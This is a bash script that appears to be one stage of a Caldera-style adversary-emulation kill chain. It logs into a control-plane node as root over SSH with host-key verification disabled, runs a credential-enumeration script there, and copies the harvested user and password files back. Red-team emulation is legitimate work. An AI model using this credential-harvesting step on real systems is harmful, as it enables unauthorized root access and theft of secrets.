#!/usr/bin/env bash
set -euo pipefail

SSH_KEY="$DATA_PATH/KC6/ssh/ssh-key"
OUT_FILE="$DATA_PATH/KC6/logenum"

SSH_OPTS=(
  -i "$SSH_KEY"
  -o BatchMode=yes
  -o ConnectTimeout=8
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o IdentitiesOnly=yes
  -o LogLevel=ERROR
)

SCP_OPTS=(
  -i "$SSH_KEY"
  -P 122
  -o BatchMode=yes
  -o ConnectTimeout=8
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o IdentitiesOnly=yes
  -o LogLevel=ERROR
)

ssh "${SSH_OPTS[@]}" -p 122 "root@$CONTROL_PLANE_NODE" \
  /usr/bin/env bash -s -- "/tmp" "$REGISTRY_USER" "$REGISTRY_PASS" "$HOSTREGISTRY" \
  < /opt/caldera/KC2/pass-enum.sh > "$OUT_FILE"
scp "${SCP_OPTS[@]}" "root@$CONTROL_PLANE_NODE:/tmp/user" /tmp/user
scp "${SCP_OPTS[@]}" "root@$CONTROL_PLANE_NODE:/tmp/pass" /tmp/pass

cat "$OUT_FILE"
